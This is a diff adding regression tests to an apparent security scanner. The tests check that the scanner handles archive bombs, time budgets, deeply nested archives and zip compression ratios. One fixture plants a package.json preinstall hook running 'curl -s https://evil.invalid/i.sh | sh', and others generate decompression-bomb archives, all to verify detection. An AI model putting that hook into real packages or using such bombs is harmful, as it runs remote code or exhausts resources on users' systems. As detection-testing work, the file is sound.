@@ -179,3 +179,121 @@ class TestH2PrunedDirectoriesAreVisible:
         root.mkdir()
         (root / "app.js").write_text("const a = 1;\n", encoding="utf-8")
         assert not [f for f in self.scan(root).findings if f.rule_id == "POLICY.COVERAGE.PRUNED"]
+
+
+class TestH4ArchiveLimitsBindBeforeAllocation:
+    """`list(archive)` walked every tar header first, allocating a `TarInfo` per
+    entry and decompressing the whole stream to do it, before
+    `max_archive_entries`, `max_uncompressed_bytes` or the ratio ceiling had
+    been consulted once.
+
+    An 18 MB tar.gz of three million empty entries took 45 seconds and 1.5 GB of
+    resident memory before the 50,000-entry limit bound. A 180 MB archive
+    reaches roughly 15 GB and OOM-kills the runner, taking co-tenant jobs with
+    it. `--timeout` did not help, because the whole thing happened inside one
+    unit.
+    """
+
+    def bomb(self, tmp_path: Path, entries: int = 200_000) -> Path:
+        import io
+        import tarfile
+
+        out = tmp_path / "bomb.tar.gz"
+        with tarfile.open(out, "w:gz") as archive:
+            for index in range(entries):
+                info = tarfile.TarInfo(f"f{index}")
+                info.size = 0
+                archive.addfile(info, io.BytesIO(b""))
+        return out
+
+    def test_the_entry_limit_binds_during_iteration(self, tmp_path: Path) -> None:
+        from cordon_scanner.archive.safe import ArchiveReader
+        from cordon_scanner.core.limits import DEFAULT_LIMITS
+
+        data = self.bomb(tmp_path).read_bytes()
+        result = ArchiveReader.extract(data, path="bomb.tar.gz", limits=DEFAULT_LIMITS)
+        assert result.truncated
+        assert len(result.members) <= DEFAULT_LIMITS.max_archive_entries
+
+    def test_a_budget_bounds_the_whole_scan(self, tmp_path: Path) -> None:
+        """Most of the cost is matching, not expanding: a 50,000-member archive
+        expands in about a second and then takes eight to match. A deadline that
+        covered only expansion bounded the wrong half."""
+        bomb = self.bomb(tmp_path)
+        config = Config.default().with_overrides(
+            use_cache=False, limits=Config.default().limits.merged(total_timeout=2.0)
+        )
+        started = time.monotonic()
+        result = Scanner(config).scan(bomb)
+        elapsed = time.monotonic() - started
+
+        assert elapsed < 20, f"the budget did not bind ({elapsed:.1f}s)"
+        assert not result.complete, "a truncated scan reported complete"
+
+
+class TestH5DeepNestingIsNotSilent:
+    """`walk_archive` recursed only while `depth < max_archive_depth` and at the
+    boundary fell through to yielding the nested archive as opaque bytes -- its
+    contents never examined, nothing appended to `rejected`.
+
+    A payload survived three layers of wrapping and disappeared at the fourth,
+    with the scan still reporting complete. The limits module states the
+    invariant it broke: "reaching a limit produces an OPERATIONAL finding, it is
+    never a silent skip".
+    """
+
+    def wrapped(self, tmp_path: Path, levels: int) -> Path:
+        import io
+        import tarfile
+        import zipfile
+
+        inner = io.BytesIO()
+        with tarfile.open(fileobj=inner, mode="w:gz") as archive:
+            body = b'{"name":"x","scripts":{"preinstall":"curl -s https://evil.invalid/i.sh | sh"}}'
+            info = tarfile.TarInfo("package/package.json")
+            info.size = len(body)
+            archive.addfile(info, io.BytesIO(body))
+
+        data = inner.getvalue()
+        for level in range(levels):
+            out = io.BytesIO()
+            with zipfile.ZipFile(out, "w") as zipped:
+                zipped.writestr("inner.tgz" if level == 0 else "inner.zip", data)
+            data = out.getvalue()
+
+        target = tmp_path / f"level{levels}.zip"
+        target.write_bytes(data)
+        return target
+
+    def scan(self, path: Path):
+        return Scanner(Config.default().with_overrides(use_cache=False)).scan(path)
+
+    def test_within_the_limit_the_payload_is_found(self, tmp_path: Path) -> None:
+        result = self.scan(self.wrapped(tmp_path, 2))
+        assert any(f.category.value == "malicious" for f in result.findings)
+
+    def test_past_the_limit_it_is_reported_not_dropped(self, tmp_path: Path) -> None:
+        """The contents still are not examined -- that is what a depth limit
+        means. What must not happen is looking identical to a clean archive."""
+        result = self.scan(self.wrapped(tmp_path, 5))
+        assert not result.complete, "a scan that stopped early reported complete"
+        assert any("ARCHIVE" in f.rule_id for f in result.findings), (
+            "one extra layer of wrapping hid the payload silently"
+        )
+
+
+class TestZipRatioIsChecked:
+    """The tar path called `_check_ratio` and the zip path did not, so the
+    compression-ratio ceiling -- the control the archive module documents first
+    -- applied to exactly one of the two formats it supports."""
+
+    def test_a_high_ratio_zip_is_reported(self, tmp_path: Path) -> None:
+        import zipfile
+
+        out = tmp_path / "ratio.zip"
+        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
+            archive.writestr("big.txt", b"A" * (60 * 1024 * 1024))
+
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(out)
+        assert not result.complete
+        assert any("ARCHIVE" in f.rule_id for f in result.findings)
